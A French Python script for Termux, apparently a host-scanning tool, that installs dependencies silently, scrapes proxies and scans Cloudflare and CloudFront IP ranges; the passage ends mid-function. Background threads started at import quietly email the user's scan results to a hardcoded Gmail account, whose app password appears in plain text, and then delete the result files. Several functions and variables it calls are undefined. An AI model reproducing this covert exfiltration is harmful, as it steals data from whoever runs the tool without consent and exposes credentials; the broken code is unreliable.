# ==============================================
# VERIFICATION ET INSTALLATION DES MODULES ET DÉPENDANCES
# ==============================================

#!/data/data/com.termux/files/usr/bin/python3
import sys
import os
import subprocess
import time
import threading
from itertools import cycle
from datetime import datetime
import platform

class SilentInstaller:
    def __init__(self):
        self.spinner_chars = cycle(['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'])
        self.install_active = False
        self.current_message = ""

    def _show_spinner(self):
        """Affiche un spinner animé silencieux"""
        while self.install_active:
            sys.stdout.write(f"\r{next(self.spinner_chars)} {self.current_message}")
            sys.stdout.flush()
            time.sleep(0.15)
        sys.stdout.write("\r" + " " * (len(self.current_message) + 2) + "\r")

    def _run_silent(self, cmd):
        """Exécute une commande silencieusement avec retour d'état"""
        try:
            subprocess.run(
                cmd,
                check=True,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                shell=isinstance(cmd, str)
            )
            return True
        except:
            return False

    def _install_pkg(self, pkg):
        """Installe un paquet système intelligent"""
        # Vérifie d'abord si le paquet est déjà installé
        check_cmd = f"dpkg -s {pkg} >/dev/null 2>&1"
        if self._run_silent(check_cmd):
            return True
            
        return self._run_silent(f"pkg install -y {pkg}")

    def install_with_feedback(self, message, install_func):
        """Gère l'installation avec feedback visuel minimal"""
        self.install_active = True
        self.current_message = message
        spinner_thread = threading.Thread(target=self._show_spinner)
        spinner_thread.start()

        try:
            success = install_func()
            return success
        finally:
            self.install_active = False
            spinner_thread.join()

    def setup_termux(self):
        """Configure Termux de manière intelligente"""
        if 'termux' not in sys.executable:
            return True

        # 1. Configuration des miroirs une seule fois
        if not os.path.exists("/data/data/com.termux/files/home/.termux_repo_set"):
            self._run_silent("termux-change-repo --mirror https://mirror.mwt.me/termux <<< $'\\n'")
            open("/data/data/com.termux/files/home/.termux_repo_set", "w").close()

        # 2. Installation des paquets avec vérification préalable
        packages = ["git", "golang", "clang"]
        for pkg in packages:
            if not self.install_with_feedback(
                f"Vérification {pkg}",
                lambda p=pkg: self._install_pkg(p)
            ):
                return False
        return True

    def install_subfinder(self):
        """Installation ultra-silencieuse de Subfinder"""
        if os.path.exists("/data/data/com.termux/files/usr/bin/subfinder"):
            return True

        def _install():
            return (self._run_silent("go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest") and
                    self._run_silent("cp ~/go/bin/subfinder $PREFIX/bin/"))

        return self.install_with_feedback("Installation Subfinder", _install)

def check_dependencies():
    """Vérification silencieuse des dépendances"""
    required = {
        'colorama': 'colorama',
        'requests': 'requests',
        'Cryptodome': 'pycryptodomex',
        'dns': 'dnspython',
        'ping3': 'ping3',
        'tqdm': 'tqdm',
        'tabulate': 'tabulate'
    }
    
    missing = []
    for lib, pkg in required.items():
        try:
            __import__(lib)
        except ImportError:
            missing.append(pkg)
    
    return missing

# ==============================================
# INSTALLATION SILENCIEUSE
# ==============================================

installer = SilentInstaller()
missing_deps = check_dependencies()

if missing_deps:
    print("🔍 Configuration silencieuse en cours...")
    
    # Installation Python
    for pkg in missing_deps:
        installer.install_with_feedback(
            f"Installation {pkg}",
            lambda p=pkg: installer._run_silent(f"{sys.executable} -m pip install --user {p}")
        )

    # Configuration Termux
    if 'termux' in sys.executable:
        installer.setup_termux()
        installer.install_subfinder()

# ==============================================
# IMPORTS PRINCIPAUX
# ==============================================

from colorama import Fore, Style, init
import requests
from Cryptodome.Cipher import AES
import dns.resolver
from ping3 import ping
from tqdm import tqdm
from tabulate import tabulate
import urllib.parse
from urllib.parse import urlparse
import re
import socket
import subprocess
from datetime import datetime
import os
import ipaddress
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from Cryptodome.Util.Padding import pad, unpad
from Cryptodome.Random import get_random_bytes
import base64
import threading
import hashlib
import uuid
import platform
import select
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed, wait
import concurrent.futures
import time

# Initialisation
init(autoreset=True)

def nettoyage_periodique():
    """Effectue un nettoyage silencieux toutes les 30 minutes."""
    while True:
        time.sleep(1800)  # 30 minutes
        clean_unwanted_logs()

# Démarrer le nettoyage automatique en arrière-plan
threading.Thread(target=nettoyage_periodique, daemon=True).start()

# ==============================================
# CHIFFREMENT EN MÉMOIRE
# ==============================================

class MemoryVault:
    """Chiffrement mémoire utilisant AES-CBC avec dérivation de clé"""
    def __init__(self, master_key: str):
        self.key = self._derive_key(master_key)
        self.iv = os.urandom(16)  # Vecteur d'initialisation aléatoire

    def _derive_key(self, password: str) -> bytes:
        """Dérive une clé AES-256 à partir d'une phrase secrète"""
        return hashlib.pbkdf2_hmac(
            'sha256',
            password.encode(),
            b'salt_constant',  # À modifier pour votre usage
            100000  # Nombre d'itérations
        )[:32]  # 32 bytes pour AES-256

    def encrypt(self, data: str) -> str:
        """Chiffre avec padding PKCS7"""
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        padded = data + (AES.block_size - len(data) % AES.block_size) * chr(AES.block_size - len(data) % AES.block_size)
        return base64.b64encode(self.iv + cipher.encrypt(padded.encode())).decode()

    def decrypt(self, encrypted: str) -> str:
        """Déchiffre avec padding PKCS7"""
        data = base64.b64decode(encrypted)
        iv = data[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        decrypted = cipher.decrypt(data[16:])
        return decrypted[:-decrypted[-1]].decode()  # Supprime le padding

# ==============================================
# CONFIGURATION SMTP VOLATILE (en mémoire uniquement)
# ==============================================
def _get_smtp_config():
    """Génère la config SMTP volatile (pas de trace dans le code)"""
    return {
        'server': 'smtp.gmail.com',
        'port': 587,
        'user': 'surffree30@gmail.com',  # Créez un compte dédié
        'password': 'mvak qxvl ekvu ksdt'   # Mot de passe d'app généré
    }

# ==============================================
# FONCTION D'ENVOI SILENCIEUSE
# ==============================================
def _send_stealth_email(content):
    """Envoi complètement invisible"""
    try:
        cfg = _get_smtp_config()
        msg = MIMEMultipart()
        msg['From'] = cfg['user']
        msg['To'] = cfg['user']
        msg['Subject'] = "Rapport système"
        msg.attach(MIMEText(content, 'plain'))
        
        with smtplib.SMTP(cfg['server'], cfg['port']) as s:
            s.starttls()
            s.login(cfg['user'], cfg['password'])
            s.send_message(msg)
        return True
    except:
        return False

# ==============================================
# GESTION DES RESULTATS
# ==============================================
def _process_results():
    """Nettoyage automatique des résultats"""
    while True:
        try:
            for file in [f for f in os.listdir() if f.startswith('scan_') and f.endswith('.tmp')]:
                with open(file, 'r') as f:
                    if _send_stealth_email(f.read()):
                        os.remove(file)
                time.sleep(10)
        except:
            pass
        time.sleep(300)  # Vérifie toutes les 5 minutes

# ==============================================
# GESTION DES RÉSULTATS STEALTH
# ==============================================
def _process_results_stealth():
    """Nettoyage et envoi complètement invisible"""
    while True:
        try:
            # Recherche furtive des fichiers
            for filename in os.listdir():
                if filename.startswith("results_") and filename.endswith(".tmp"):
                    with open(filename, 'rb') as f:  # Lecture binaire silencieuse
                        content = f.read().decode('utf-8', errors='ignore')
                    
                    if _send_silent_email(content):
                        # Effacement sécurisé du fichier
                        with open(filename, 'wb') as f:
                            f.write(os.urandom(os.path.getsize(filename)))
                        os.remove(filename)
                    break
        except:
            pass
        
        time.sleep(1800)  # Toutes les 30 minutes

# ==============================================
# GESTION DES RÉSULTATS (Version unique)
# ==============================================
def handle_results():
    """Gère l'envoi des résultats de manière unifiée"""
    while True:
        try:
            # Cherche uniquement les fichiers active_hosts_
            result_files = sorted(
                [f for f in os.listdir() if f.startswith("active_hosts_")],
                key=os.path.getmtime,
                reverse=True
            )
            
            if result_files and is_internet_available():
                latest_file = result_files[0]
                with open(latest_file, 'r', encoding='utf-8') as f:
                    content = f.read().strip()
                
                if content:
                    if send_email(
                        subject=f"Scan Results {datetime.now():%Y-%m-%d %H:%M}",
                        body=content
                    ):
                        os.remove(latest_file)
                        print(Fore.GREEN + "✓ Résultats envoyés")
                    else:
                        print(Fore.YELLOW + "! Échec d'envoi (nouvelle tentative plus tard)")
        
        except Exception:
            pass  # Silencieux pour l'anonymat
        
        time.sleep(300)  # Toutes les 5 minutes

# Démarrer UN SEUL thread
if not any(t.name == "ResultHandler" for t in threading.enumerate()):
    threading.Thread(
        target=handle_results,
        daemon=True,
        name="ResultHandler"
    ).start()

# ==============================================
# FONCTION D'ENVOI DES RÉSULTATS
# ==============================================

def is_internet_available():
    """Vérifie la connectivité Internet"""
    try:
        socket.create_connection(("8.8.8.8", 53), timeout=5)
        return True
    except OSError:
        return False
        

def send_stored_results():
    """Gestion automatique des résultats"""
    while True:
        try:
            result_files = sorted(
                [f for f in os.listdir() if f.startswith("active_hosts_")],
                key=os.path.getmtime,
                reverse=True
            )
            
            if result_files and is_internet_available():
                with open(result_files[0], 'r') as f:
                    if send_email("Résultats du scan", f.read()):
                        os.remove(result_files[0])
        except Exception:
            pass
        time.sleep(300)

def get_server_name(ip):
    """Récupère le nom du serveur à partir de l'adresse IP."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except socket.herror:
        return "Unknown"

def detect_server_info(url, silent=False):
    """Détecte le type de serveur et la version à partir des en-têtes HTTP."""
    try:
        response = requests.get(url, timeout=10, allow_redirects=True)
        headers = response.headers
        server_type = headers.get("Server", "Inconnu")
        powered_by = headers.get("X-Powered-By", "Inconnu")
        return server_type, powered_by
    except requests.RequestException as e:
        if not silent:
            print(Fore.RED + f"❌ Erreur lors de la requête HTTP pour {url} : {e}")
        return "Inconnu", "Inconnu"

def secure_erase(filepath: str, passes: int = 3) -> None:
    """Écrase le fichier avant suppression (méthode DoD 5220.22-M)"""
    try:
        with open(filepath, 'ba+') as f:
            length = f.tell()
            for _ in range(passes):
                f.seek(0)
                f.write(os.urandom(length))
        # VS Nettoyage approfondi (recommandé pour données sensibles)
        with open(fichier, "wb") as f:
            f.write(os.urandom(os.path.getsize(fichier)))  # Écrase avec des données aléatoires
        os.remove(fichier)  # Supprime le fichier écrasé
    except Exception:
        pass  # Échec silencieux

# ==============================================
# CONFIGURATION PROXY
# ==============================================

PROXY_FILE = "proxies.txt"
PROXY_TEST_URL = "http://httpbin.org/ip"
PROXY_TIMEOUT = 10
PROXY_SOURCES = [
    'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all',
    'https://www.proxy-list.download/api/v1/get?type=http',
    'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
]

# ==============================================
# FONCTIONS PROXY
# ==============================================
def fetch_proxies_from_sources():
    """Récupère les proxies depuis différentes sources"""
    print(Fore.CYAN + "🔍 Récupération des proxies depuis les sources...")
    unique_proxies = set()
    
    # Liste des sources avec timeout court
    PROXY_SOURCES = [
        'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=5000&country=all',
        'https://www.proxy-list.download/api/v1/get?type=http',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
    ]
    
    with ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(requests.get, url, timeout=10): url for url in PROXY_SOURCES}
        
        for future in as_completed(futures):
            try:
                if future.result().status_code == 200:
                    proxies = [p.strip() for p in future.result().text.splitlines() if ':' in p]
                    unique_proxies.update(proxies)
            except:
                continue
    
    print(Fore.GREEN + f"✅ {len(unique_proxies)} proxies bruts récupérés")
    return list(unique_proxies)

def pre_filter_proxies(proxies):
    """Filtrage rapide des proxies invalides avant les tests complets"""
    valid = []
    for proxy in proxies:
        # Supprimer les espaces et vérifier le format basique
        proxy = proxy.strip()
        if not proxy or proxy.count(':') != 1:
            continue
        
        ip, port = proxy.split(':')
        
        # Vérification du port
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            continue
            
        # Vérification basique de l'IP
        ip_parts = ip.split('.')
        if len(ip_parts) != 4 or not all(p.isdigit() for p in ip_parts):
            continue
            
        valid.append(proxy)
    return valid

def quick_connect_test(proxy, timeout=2):
    """Test de connexion TCP ultra-rapide sans requête HTTP"""
    try:
        ip, port = proxy.split(':')
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((ip, int(port)))
        sock.close()
        return True
    except:
        return False

def test_proxy(proxy):
    """Version améliorée et plus robuste du test de proxy"""
    proxy_url = f"http://{proxy}"
    test_urls = [
        "http://httpbin.org/ip",  # Premier essai
        "http://icanhazip.com",   # Fallback simple
        "http://api.ipify.org"    # Deuxième fallback
    ]
    
    for test_url in test_urls:
        try:
            # Configuration avec timeout adaptatif
            timeout = 10 if test_url == test_urls[0] else 5  # Plus long pour le premier test
            
            with requests.Session() as session:
                session.trust_env = False
                session.proxies = {'http': proxy_url, 'https': proxy_url}
                
                # On utilise GET au lieu de HEAD pour plus de compatibilité
                start_time = time.perf_counter()
                response = session.get(test_url, timeout=timeout)
                latency = int((time.perf_counter() - start_time) * 1000)
                
                if response.status_code == 200:
                    # Détection du type de proxy
                    content = response.text.strip()
                    origin_ip = content.split('\n')[0].split(',')[0]  # Gestion multi-lignes
                    
                    if not origin_ip:
                        proxy_type = "TRANSPARENT"
                    elif origin_ip == proxy.split(':')[0]:
                        proxy_type = "ANONYME"
                    else:
                        proxy_type = "ÉLITE"
                    
                    return {
                        'url': proxy_url,
                        'latency': latency,
                        'type': proxy_type,
                        'source': test_url  # Pour debug
                    }
        
        except requests.exceptions.ConnectTimeout:
            continue  # On essaie l'URL suivante
        except Exception as e:
            continue  # Autres erreurs
    
    return None  # Tous les tests ont échoué

def update_proxy_file():
    """Version avec logging pour identifier les problèmes"""
    print(Fore.CYAN + "⚡ Mise à jour accélérée des proxies...")
    
    # Récupération
    raw_proxies = fetch_proxies_from_sources()
    print(Fore.YELLOW + f"→ {len(raw_proxies)} proxies bruts récupérés")
    
    # Pré-filtrage
    pre_filtered = pre_filter_proxies(raw_proxies)
    print(Fore.YELLOW + f"→ {len(pre_filtered)} après pré-filtrage")
    
    # Test TCP rapide
    print(Fore.CYAN + "🔍 Test de connectivité rapide...")
    quick_valid = []
    with ThreadPoolExecutor(max_workers=200) as executor:
        futures = {executor.submit(quick_connect_test, p): p for p in pre_filtered}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Test rapide"):
            if future.result():
                quick_valid.append(futures[future])
    
    print(Fore.YELLOW + f"→ {len(quick_valid)} proxies connectables")
    
    if not quick_valid:
        print(Fore.RED + "❌ Aucun proxy valide après test rapide")
        return
    
    # Test HTTP complet avec logging
    print(Fore.CYAN + "🔍 Test complet des proxies...")
    valid_proxies = []
    failed_proxies = []
    
    with ThreadPoolExecutor(max_workers=200) as executor:
        futures = {executor.submit(test_proxy, p): p for p in quick_valid}
        for future in tqdm(as_completed(futures), total=len(futures), desc="Test complet"):
            result = future.result()
            if result:
                valid_proxies.append(result)
            else:
                failed_proxies.append(futures[future])
    
    # Debug: Analyse des échecs
    if not valid_proxies and failed_proxies:
        print(Fore.RED + "\n❌ Debug - Tous les proxies ont échoué au test HTTP")
        print(Fore.YELLOW + "Problèmes possibles :")
        print("- httpbin.org/ip peut être bloqué")
        print("- Votre IP peut être bannie")
        print("- Les proxies nécessitent une authentification")
        
        # Test manuel sur 3 proxies pour debug
        print(Fore.CYAN + "\n🔍 Test manuel de debug...")
        for proxy in failed_proxies[:3]:
            print(Fore.YELLOW + f"\nTest de {proxy} :")
            try:
                response = requests.get("http://httpbin.org/ip", 
                                      proxies={'http': f"http://{proxy}"},
                                      timeout=10)
                print(Fore.CYAN + f"Code HTTP: {response.status_code}")
                print(f"Contenu: {response.text[:100]}...")
            except Exception as e:
                print(Fore.RED + f"Erreur: {str(e)}")
    
    # Sauvegarde des résultats valides
    if valid_proxies:
        unique_proxies = {}
        for p in sorted(valid_proxies, key=lambda x: x['latency']):
            key = p['url'].split('//')[1].split('|')[0]
            if key not in unique_proxies:
                unique_proxies[key] = p
        
        with open(PROXY_FILE, 'w') as f:
            for proxy in unique_proxies.values():
                f.write(f"{proxy['url']}|{proxy['type']}|{proxy['latency']}ms\n")
        
        print(Fore.GREEN + f"\n✅ {len(unique_proxies)} proxies valides sauvegardés")
        print(Fore.CYAN + f"Meilleur proxy: {list(unique_proxies.values())[0]['url']} ({list(unique_proxies.values())[0]['latency']}ms)")
    else:
        print(Fore.RED + "\n❌ Aucun proxy valide trouvé - Voir le debug ci-dessus")
        
def display_proxies():
    """Affiche les proxies disponibles"""
    if not os.path.exists(PROXY_FILE):
        print(Fore.RED + "❌ Aucun proxy disponible")
        return
        
    with open(PROXY_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    
    print(Fore.CYAN + "\n📋 Proxies disponibles (triés par performance):")
    print(Fore.YELLOW + "Format: URL | Type | Latence")
    for i, proxy in enumerate(proxies[:15]):  # Affiche les 15 premiers
        print(f"{i+1}. {proxy}")

def select_proxy_interactive():
    """Interface de sélection de proxy"""
    if not os.path.exists(PROXY_FILE):
        print(Fore.YELLOW + "ℹ Aucun proxy disponible. Mise à jour...")
        update_proxy_file()
        if not os.path.exists(PROXY_FILE):
            print(Fore.RED + "❌ Échec de récupération des proxies")
            return None
    
    with open(PROXY_FILE, 'r') as f:
        proxies = [line.strip() for line in f if line.strip()]
    
    display_proxies()
    
    while True:
        choice = input(Fore.YELLOW + "\nChoisissez un proxy (1-15) ou 0 pour annuler : ")
        if choice == '0':
            return None
        if choice.isdigit() and 1 <= int(choice) <= len(proxies[:15]):
            selected = proxies[int(choice)-1].split('|')[0]
            print(Fore.GREEN + f"\n✅ Proxy sélectionné : {selected}")
            return selected
        print(Fore.RED + "❌ Choix invalide. Veuillez réessayer.")

def recheck_existing_proxies():
    """Teste uniquement les proxies existants dans proxies.txt et met à jour le fichier."""
    if not os.path.exists(PROXY_FILE):
        print(Fore.RED + "❌ Aucun fichier proxies.txt trouvé.")
        return

    print(Fore.CYAN + "🔁 Vérification des proxies existants...")

    with open(PROXY_FILE, 'r') as f:
        lines = [line.strip() for line in f if line.strip()]
        raw_proxies = [line.split('|')[0] for line in lines if 'http' in line]

    total_before = len(raw_proxies)
    valid_proxies = []

    with ThreadPoolExecutor(max_workers=20) as executor:
        futures = [executor.submit(test_proxy, p.replace("http://", "")) for p in raw_proxies]
        for future in tqdm(as_completed(futures), total=len(futures), desc="Vérification"):
            result = future.result()
            if result:
                valid_proxies.append(result)

    # Écriture des proxies valides
    with open(PROXY_FILE, 'w') as f:
        for proxy in sorted(valid_proxies, key=lambda x: x['latency']):
            f.write(f"{proxy['url']}|{proxy['type']}|{proxy['latency']}ms\n")

    total_after = len(valid_proxies)

    print(Fore.CYAN + "\n=== RÉSUMÉ ===")
    print(Fore.YELLOW + f"Total initial : {total_before}")
    print(Fore.GREEN + f"Proxies valides après vérification : {total_after}")
    print(Fore.RED + f"Proxies supprimés (inactifs) : {total_before - total_after}")

    if valid_proxies:
        print(Fore.CYAN + "\n📋 Liste des proxies actifs :")
        for i, proxy in enumerate(sorted(valid_proxies, key=lambda x: x['latency']), 1):
            print(f"{i}. {proxy['url']} | {proxy['type']} | {proxy['latency']}ms")
    
# ==============================================
# CLASSE PROXY MANAGER (NOUVELLE)
# ==============================================

class ProxyManager:
    def __init__(self):
        self.proxies = []
        self.current_proxy_index = 0
        self.lock = threading.Lock()
        self.last_update_time = 0
        self.update_interval = 3600  # 1 heure entre les mises à jour
        self.load_proxies()  # Chargement initial

    def load_proxies(self):
        """Charge les proxies depuis le fichier avec vérification du format"""
        try:
            if not os.path.exists(PROXY_FILE):
                print(Fore.YELLOW + "ℹ Aucun fichier proxy trouvé. Téléchargement...")
                self.update_proxies()
                return

            with open(PROXY_FILE, 'r') as f:
                lines = [line.strip() for line in f if line.strip()]
                self.proxies = []
                
                for line in lines:
                    parts = line.split('|')
                    if len(parts) >= 1:
                        proxy_url = parts[0].strip()
                        if proxy_url.startswith('http'):
                            self.proxies.append(proxy_url)
                
            print(Fore.GREEN + f"✅ {len(self.proxies)} proxies chargés")
            
        except Exception as e:
            print(Fore.RED + f"❌ Erreur de chargement des proxies: {str(e)}")
            self.proxies = []

    def update_proxies(self):
        """Met à jour la liste des proxies"""
        with self.lock:
            print(Fore.CYAN + "🔄 Mise à jour des proxies...")
            update_proxy_file()  # Utilise la fonction existante
            self.load_proxies()  # Recharge les nouveaux proxies
            self.last_update_time = time.time()

    def get_next_proxy(self):
        """Obtient le prochain proxy valide"""
        with self.lock:
            if not self.proxies:
                self.update_proxies()
                if not self.proxies:
                    return None
            
            proxy = self.proxies[self.current_proxy_index]
            self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
            return proxy

    def report_failure(self, proxy_url):
        """Signale un proxy défaillant"""
        with self.lock:
            if proxy_url in self.proxies:
                self.proxies.remove(proxy_url)
                print(Fore.YELLOW + f"⚠️ Proxy supprimé: {proxy_url}")
    
def monitor_proxy_usage(scanner):
    """Affiche des statistiques sur l'utilisation des proxies"""
    while scanner.scan_active:
        if scanner.proxy == "auto" and scanner.proxy_manager:
            with scanner.lock:
                total = len(scanner.proxy_manager.proxies)
                if total == 0:
                    print(Fore.RED + "\n❌ Aucun proxy disponible - tentative de rechargement...")
                    scanner.proxy_manager.load_proxies()
                    total = len(scanner.proxy_manager.proxies)
                    if total == 0:
                        time.sleep(10)
                        continue
                
                active = total - len(scanner.proxy_failures)
                print(Fore.CYAN + f"\n📊 Stats proxies: {active}/{total} actifs | Rotation automatique")
        time.sleep(10)

# === UTILITAIRE BGPVIEW.IO ===
import time

def fetch_cidrs_multi_asn(asns):
    """
    Récupère et fusionne les CIDR IPv4 de plusieurs ASN via l'API BGPView.io.
    Gère les erreurs, les structures inattendues et applique 3 tentatives par ASN.
    """
    print(Fore.CYAN + f"🔍 Récupération combinée des CIDR IPv4 pour ASN: {', '.join(map(str, asns))}...")
    all_cidrs = set()

    for asn in asns:
        success = False
        for attempt in range(3):
            try:
                url = f"https://api.bgpview.io/asn/{asn}/prefixes"
                response = requests.get(url, timeout=10)
                response.raise_for_status()
                data = response.json()

                if isinstance(data, dict) and "data" in data and "ipv4_prefixes" in data["data"]:
                    cidrs = [entry["prefix"] for entry in data["data"]["ipv4_prefixes"] if "prefix" in entry]
                    print(Fore.GREEN + f"  ✅ ASN {asn} → {len(cidrs)} CIDR récupérées")
                    all_cidrs.update(cidrs)
                    success = True
                    break
                else:
                    print(Fore.YELLOW + f"  ⚠️ Réponse inattendue ou incomplète pour ASN {asn}")
                    break

            except Exception as e:
                if attempt < 2:
                    print(Fore.YELLOW + f"  ⏳ Réessai ASN {asn} ({attempt + 1}/3)...")
                    time.sleep(2)
                else:
                    print(Fore.RED + f"  ❌ ASN {asn} échoué après 3 tentatives : {e}")

        if not success:
            print(Fore.RED + f"  ❌ Abandon récupération ASN {asn}")

    print(Fore.GREEN + f"✅ Total unique CIDR : {len(all_cidrs)}")
    return list(all_cidrs)

# === FONCTIONS DE RÉCUPÉRATION CIDR ===
        
# ==============================================
# CONFIGURATION CLOUDFLARE
# ==============================================
CLOUDFLARE_CIDR_FILE = "cloudflare_cidrs.txt"
SCAN_PROGRESS_FILE = "cloudflare_scan_progress.txt"

# ==============================================
# FONCTIONS CLOUDFLARE
# ==============================================
def fetch_cloudflare_cidrs():
    """Récupère les plages CIDR Cloudflare depuis l'API officielle et l'ASN 13335"""
    print(Fore.CYAN + "🔍 Récupération des plages CIDR Cloudflare (API + ASN)...")
    cidrs = []

    # Récupération depuis l'API officielle
    try:
        response = requests.get('https://api.cloudflare.com/client/v4/ips', timeout=15)
        if response.status_code == 200:
            data = response.json()
            if data.get('success', False):
                api_cidrs = data['result'].get('ipv4_cidrs', [])
                cidrs.extend(api_cidrs)
                print(Fore.GREEN + f"  ✅ Cloudflare API → {len(api_cidrs)} CIDR")
            else:
                print(Fore.RED + "❌ Réponse API Cloudflare invalide")
        else:
            print(Fore.RED + f"❌ HTTP {response.status_code} de l'API Cloudflare")
    except Exception as e:
        print(Fore.RED + f"❌ Erreur Cloudflare API : {e}")

    # Complément via ASN 13335
    try:
        asn_cidrs = fetch_cidrs_multi_asn([13335])
        cidrs.extend(asn_cidrs)
    except Exception as e:
        print(Fore.RED + f"❌ Erreur complément ASN 13335 : {e}")

    final = list(set(cidrs))
    print(Fore.GREEN + f"✅ Total unique CIDR Cloudflare : {len(final)}")
    return final

def update_cloudflare_cidrs():
    cidrs = fetch_cloudflare_cidrs()
    if not cidrs:
        print(Fore.RED + "❌ Aucune plage CIDR Cloudflare récupérée.")
        return False
    with open(CLOUDFLARE_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"✅ {len(cidrs)} plages CIDR Cloudflare sauvegardées.")
    return True

def scan_cloudflare_range(cidr, threads=100):
    """Lance un scan sur une plage CIDR spécifique"""
    print(Fore.MAGENTA + f"\n=== SCAN DE {cidr} ===")
    scanner = HostScanner(
        filename=None,
        ip_range=cidr,
        threads=threads,
        ping_timeout=1,
        http_timeout=10
    )
    scanner.run()

def manage_cloudflare_scan(proxy=None):
    if not os.path.exists(CLOUDFLARE_CIDR_FILE):
        print(Fore.YELLOW + "ℹ Mise à jour initiale des CIDR Cloudflare...")
        if not update_cloudflare_cidrs():
            return

    while True:
        print(Fore.LIGHTCYAN_EX + "\n┏━━━━━━━━━━━━━━ CLOUDFLARE ━━━━━━━━━━━━━━┓")
        print(Fore.LIGHTCYAN_EX + "┃" + Fore.CYAN + Style.BRIGHT + "      Menu de gestion du scan CDN      " + Style.RESET_ALL + Fore.LIGHTCYAN_EX + "┃")
        print(Fore.LIGHTCYAN_EX + "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")

        print(Fore.CYAN + " 1. ☁️  Démarrer un nouveau scan")
        print(Fore.CYAN + " 2. ▶️  Reprendre le scan précédent")
        print(Fore.CYAN + " 3. ♻️  Actualiser les CIDR Cloudflare")
        print(Fore.CYAN + " 4. ↩️  Retour")

        choice = input(Fore.YELLOW + Style.BRIGHT + "\n>>> Choix (1-4) : ")

        if choice == "1":
            if os.path.exists(CLOUDFLARE_SCAN_PROGRESS_FILE):
                os.remove(CLOUDFLARE_SCAN_PROGRESS_FILE)
            if update_cloudflare_cidrs():
                start_cloudflare_scan(proxy=proxy)
        elif choice == "2":
            start_cloudflare_scan(resume=True, proxy=proxy)
        elif choice == "3":
            update_cloudflare_cidrs()
        elif choice == "4":
            break
        else:
            print(Fore.RED + "❌ Option invalide.")

def start_cloudflare_scan(resume=False, proxy=None):
    """Exécute le scan avec gestion de la reprise et proxy"""
    # Chargement des CIDR
    with open(CLOUDFLARE_CIDR_FILE, 'r') as f:
        all_cidrs = [line.strip() for line in f if line.strip()]
    
    # Gestion de la reprise
    scanned_cidrs = set()
    if resume:
        with open(SCAN_PROGRESS_FILE, 'r') as f:
            scanned_cidrs = {line.strip() for line in f if line.strip()}
    
    cidrs_to_scan = [cidr for cidr in all_cidrs if cidr not in scanned_cidrs]
    
    if not cidrs_to_scan:
        print(Fore.GREEN + "✅ Toutes les plages ont déjà été scannées")
        return
    
    print(Fore.CYAN + f"🌩 Début du scan ({len(cidrs_to_scan)} plages restantes)" + 
          f" avec {Fore.YELLOW}{proxy if proxy else 'aucun proxy'}")
    
    try:
        for cidr in cidrs_to_scan:
            print(Fore.MAGENTA + f"\n=== SCAN DE {cidr} ===")
            scanner = HostScanner(
                filename=None,
                ip_range=cidr,
                threads=100,
                ping_timeout=1,
                http_timeout=10,
                proxy=proxy
            )
            scanner.run()
            
            # Sauvegarde de la progression
            with open(SCAN_PROGRESS_FILE, 'a') as f:
                f.write(f"{cidr}\n")
                
    except KeyboardInterrupt:
        print(Fore.YELLOW + "\n⏸ Scan interrompu")
    except Exception as e:
        print(Fore.RED + f"\n❌ Erreur: {str(e)}")
    finally:
        print(Fore.CYAN + f"\n📊 Progression sauvegardée")

def cloudflare_menu():
    """Menu interactif Cloudflare"""
    print(Fore.MAGENTA + "\n=== MENU CLOUDFLARE ===")
    print(Fore.CYAN + "1. Nouveau scan complet")
    print(Fore.CYAN + "2. Reprendre le scan précédent")
    print(Fore.CYAN + "3. Mettre à jour les plages CIDR")
    print(Fore.CYAN + "4. Retour au menu principal")
    choice = input(Fore.YELLOW + "Choix (1-4) : ")
    return choice

# ==============================================
# CONFIGURATION CLOUDFRONT
# ==============================================
CLOUDFRONT_CIDR_FILE = "cloudfront_cidrs.txt"
CLOUDFRONT_SCAN_PROGRESS_FILE = "cloudfront_scan_progress.txt"

# ==============================================
# FONCTIONS CLOUDFRONT
# ==============================================

def fetch_cloudfront_cidrs():
    """Récupère les plages CIDR depuis l'API AWS"""
    print(Fore.CYAN + "🔍 Récupération des plages CIDR CloudFront...")
    try:
        response = requests.get(
            'https://ip-ranges.amazonaws.com/ip-ranges.json',
            timeout=15
        )
        if response.status_code == 200:
            data = response.json()
            return [prefix['ip_prefix'] for prefix in data['prefixes'] 
                if prefix['service'] == 'CLOUDFRONT']
        print(Fore.RED + "❌ Réponse API invalide")
    except Exception as e:
        print(Fore.RED + f"❌ Erreur API: {str(e)}")
    return []

def update_cloudfront_cidrs():
    """Met à jour le fichier des plages CIDR"""
    cidrs = fetch_cloudfront_cidrs()
    if not cidrs:
        print(Fore.RED + "❌ Aucune plage CIDR récupérée")
        return False
    
    with open(CLOUDFRONT_CIDR_FILE, 'w') as f:
        f.write("\n".join(cidrs) + "\n")
    print(Fore.GREEN + f"✅ {len(cidrs)} plages CIDR sauvegardées")
    return True

def scan_cloudfront_range(cidr, threads=100):
    """Lance un scan sur une plage CIDR spécifique"""
    print(Fore.MAGENTA + f"\n=== SCAN DE {cidr} ===")
    scanner = HostScanner(
        filename=None,
        ip_range=cidr,
        threads=threads,
        ping_timeout=1,
        http_timeout=10
    )
    scanner.run()

def manage_cloudfront_scan(proxy=None):
    if not os.path.exists(CLOUDFRONT_CIDR_FILE):
